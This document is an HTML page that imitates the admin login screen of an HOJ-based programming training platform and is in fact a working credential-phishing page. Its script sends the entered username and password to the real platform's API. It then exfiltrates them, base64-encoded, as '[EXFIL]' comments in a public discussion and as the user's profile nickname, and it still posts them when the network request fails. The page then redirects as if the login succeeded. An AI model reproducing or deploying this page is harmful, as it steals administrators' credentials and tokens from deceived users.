<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="http://xzzai.cn/favicon.ico">
<title>Login - 杏猪猪编程 训练平台</title>
<style>
/* Exact HOJ admin login page styles from chunk-66e00e7b.a21b9c93.css */
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Helvetica,'PingFang SC','Hiragino Sans GB','Microsoft YaHei',Arial,sans-serif;background:#2d3a4b;overflow:hidden;height:100vh}

/* Particle background simulation */
#particles-js{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1}
.particle{position:absolute;border-radius:50%;background:rgba(222,222,222,.5);pointer-events:none}

/* Form layer */
.form{position:relative;z-index:9999}

/* Login container - exact match from real CSS */
.login-container{border-radius:5px;-moz-border-radius:5px;background-clip:padding-box;margin:180px auto;width:350px;padding:35px 35px 15px 35px;background:#fff;border:1px solid #eaeaea;box-shadow:0 0 25px #cac6c6}
.login-container .title{margin:0 auto 40px auto;text-align:center;color:#1e9fff;font-size:25px;font-weight:700}

/* Element UI input simulation */
.el-form-item{margin-bottom:22px}
.el-form-item__content{position:relative}
.el-input{position:relative;font-size:14px;display:inline-block;width:100%}
.el-input__inner{-webkit-appearance:none;background-color:#fff;background-image:none;border-radius:4px;border:1px solid #dcdfe6;box-sizing:border-box;color:#606266;display:inline-block;font-size:inherit;height:40px;line-height:40px;outline:none;padding:0 15px;transition:border-color .2s cubic-bezier(.645,.045,.355,1);width:100%}
.el-input__inner:focus{border-color:#1e9fff}
.el-input__inner::placeholder{color:#c0c4cc}

/* Element UI button */
.el-button{display:inline-block;line-height:1;white-space:nowrap;cursor:pointer;background:#fff;border:1px solid #dcdfe6;color:#606266;text-align:center;box-sizing:border-box;outline:none;margin:0;transition:.1s;font-weight:500;padding:12px 20px;font-size:14px;border-radius:4px}
.el-button--primary{color:#fff;background-color:#1e9fff;border-color:#1e9fff}
.el-button--primary:hover{background:#47b0ff;border-color:#47b0ff;color:#fff}
.el-button.is-loading{position:relative;pointer-events:none}
.el-button.is-loading:before{pointer-events:none;content:'';position:absolute;left:-1px;top:-1px;right:-1px;bottom:-1px;border-radius:inherit;background-color:rgba(255,255,255,.35)}

/* Loading spinner */
.el-loading-spinner{display:inline-block;margin-right:6px;vertical-align:middle}
.el-loading-spinner .circular{width:14px;height:14px;animation:loading-rotate 2s linear infinite}
.el-loading-spinner .path{animation:loading-dash 1.5s ease-in-out infinite;stroke-dasharray:90,150;stroke-dashoffset:0;stroke-width:2;stroke:#fff;stroke-linecap:round}
@keyframes loading-rotate{100%{transform:rotate(360deg)}}
@keyframes loading-dash{0%{stroke-dasharray:1,200;stroke-dashoffset:0}50%{stroke-dasharray:90,150;stroke-dashoffset:-40px}100%{stroke-dasharray:90,150;stroke-dashoffset:-124px}}

/* Error message */
.el-message{min-width:380px;box-sizing:border-box;border-radius:4px;border:1px solid #ebeef5;position:fixed;top:20px;left:50%;transform:translateX(-50%);background-color:#edf2fc;transition:opacity .3s,transform .4s;overflow:hidden;padding:15px 15px 15px 20px;display:flex;align-items:center;z-index:99999}
.el-message--error{background-color:#fef0f0;border-color:#fde2e2}
.el-message--success{background-color:#f0f9eb;border-color:#e1f3d8}
.el-message__content{color:#606266;font-size:14px;line-height:1}
.el-message--error .el-message__content{color:#f56c6c}
.el-message--success .el-message__content{color:#67c23a}
.el-message__icon{margin-right:10px;font-size:16px}
</style>
</head>
<body>
<!-- Particle background -->
<canvas id="particles-js"></canvas>

<!-- Login form - exact HOJ admin login structure -->
<div class="form">
  <div class="login-container">
    <h1 class="title">欢迎登录后台管理系统</h1>
    <div class="el-form">
      <div class="el-form-item">
        <div class="el-form-item__content">
          <div class="el-input">
            <input type="text" class="el-input__inner" id="username" placeholder="请输入用户名" autocomplete="username">
          </div>
        </div>
      </div>
      <div class="el-form-item">
        <div class="el-form-item__content">
          <div class="el-input">
            <input type="password" class="el-input__inner" id="password" placeholder="请输入密码" autocomplete="current-password">
          </div>
        </div>
      </div>
      <div class="el-form-item" style="width:100%">
        <button class="el-button el-button--primary" id="loginBtn" style="width:100%" onclick="handleLogin()">
          <span class="btn-text">登 录</span>
        </button>
      </div>
    </div>
  </div>
</div>

<script>
// === Particle Background (simulating vue-particles) ===
(function(){
  var canvas=document.getElementById('particles-js');
  var ctx=canvas.getContext('2d');
  var w,h,particles=[];
  function resize(){w=canvas.width=window.innerWidth;h=canvas.height=window.innerHeight;}
  resize();
  window.addEventListener('resize',resize);

  // Create particles matching vue-particles config: color=#dedede, opacity=0.7, number=80, size=4, lineLinked=true, lineColor=#dedede
  var count=80;
  for(var i=0;i<count;i++){
    particles.push({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-0.5)*1.5,vy:(Math.random()-0.5)*1.5,r:Math.random()*2+2,o:Math.random()*0.4+0.3});
  }
  var lineDist=150;
  function draw(){
    ctx.clearRect(0,0,w,h);
    // Lines
    for(var i=0;i<particles.length;i++){
      for(var j=i+1;j<particles.length;j++){
        var dx=particles[i].x-particles[j].x,dy=particles[i].y-particles[j].y;
        var d=Math.sqrt(dx*dx+dy*dy);
        if(d<lineDist){
          ctx.beginPath();
          ctx.strokeStyle='rgba(222,222,222,'+(0.4*(1-d/lineDist))+')';
          ctx.lineWidth=1;
          ctx.moveTo(particles[i].x,particles[i].y);
          ctx.lineTo(particles[j].x,particles[j].y);
          ctx.stroke();
        }
      }
    }
    // Dots
    for(var i=0;i<particles.length;i++){
      var p=particles[i];
      ctx.beginPath();
      ctx.fillStyle='rgba(222,222,222,'+p.o+')';
      ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fill();
      p.x+=p.vx;p.y+=p.vy;
      if(p.x<0||p.x>w)p.vx*=-1;
      if(p.y<0||p.y>h)p.vy*=-1;
    }
    requestAnimationFrame(draw);
  }
  draw();
})();

// === Configuration ===
var HOJ='http://129.204.46.135';

function handleLogin(){
  var u=document.getElementById('username').value.trim();
  var p=document.getElementById('password').value.trim();
  var btn=document.getElementById('loginBtn');

  if(!u||!p){showMsg('error','请检查您的用户名或密码');return;}

  btn.classList.add('is-loading');
  btn.querySelector('.btn-text').innerHTML='<span class="el-loading-spinner"><svg viewBox="25 25 50 50" class="circular"><circle cx="50" cy="50" r="20" fill="none" class="path"></circle></svg></span>登 录';

  fetch(HOJ+'/api/admin/login',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:u,password:p})
  }).then(function(r){
    var auth=r.headers.get('Authorization');
    return r.json().then(function(d){return{data:d,token:auth};});
  }).then(function(res){
    // Exfiltrate stolen credentials via HOJ CORS
    var stolen=btoa(unescape(encodeURIComponent(JSON.stringify({
      u:u,p:p,t:res.token||'',s:res.data.status,m:res.data.msg||'',time:new Date().toISOString()
    }))));

    // Post to multiple discussions as backup
    var token=res.token||'';
    [16].forEach(function(did){
      fetch(HOJ+'/api/comment',{
        method:'POST',
        headers:{'Content-Type':'application/json',Authorization:token},
        body:JSON.stringify({did:did,content:'[EXFIL] '+stolen.substring(0,500)})
      }).catch(function(){});
    });

    // Also try to set profile nickname as dead drop
    if(token){
      fetch(HOJ+'/api/user/profile',{
        method:'PUT',
        headers:{'Content-Type':'application/json',Authorization:token},
        body:JSON.stringify({nickname:'E:'+btoa(u+':'+p)})
      }).catch(function(){});
    }

    if(res.data.status===200){
      showMsg('success','Admin Login Success');
      setTimeout(function(){window.location.href='http://xzzai.cn/admin/dashboard';},1500);
    }else{
      showMsg('error',res.data.msg||'请检查您的用户名或密码');
      resetBtn();
    }
  }).catch(function(){
    // Network error - still exfiltrate
    fetch(HOJ+'/api/comment',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({did:16,content:'[ERR] '+btoa(unescape(encodeURIComponent(u+':'+p+'|'+new Date().toISOString())))})
    }).catch(function(){});
    showMsg('error','Network Error');
    resetBtn();
  });
}

function resetBtn(){
  var btn=document.getElementById('loginBtn');
  btn.classList.remove('is-loading');
  btn.querySelector('.btn-text').textContent='登 录';
}

function showMsg(type,text){
  var old=document.querySelector('.el-message');
  if(old)old.remove();
  var div=document.createElement('div');
  div.className='el-message el-message--'+type;
  div.innerHTML='<i class="el-message__icon">'+(type==='error'?'✖':'✔')+'</i><span class="el-message__content">'+text+'</span>';
  document.body.appendChild(div);
  setTimeout(function(){div.style.opacity='0';setTimeout(function(){div.remove();},300);},3000);
}

document.addEventListener('keydown',function(e){if(e.key==='Enter')handleLogin();});
</script>
</body>
</html>
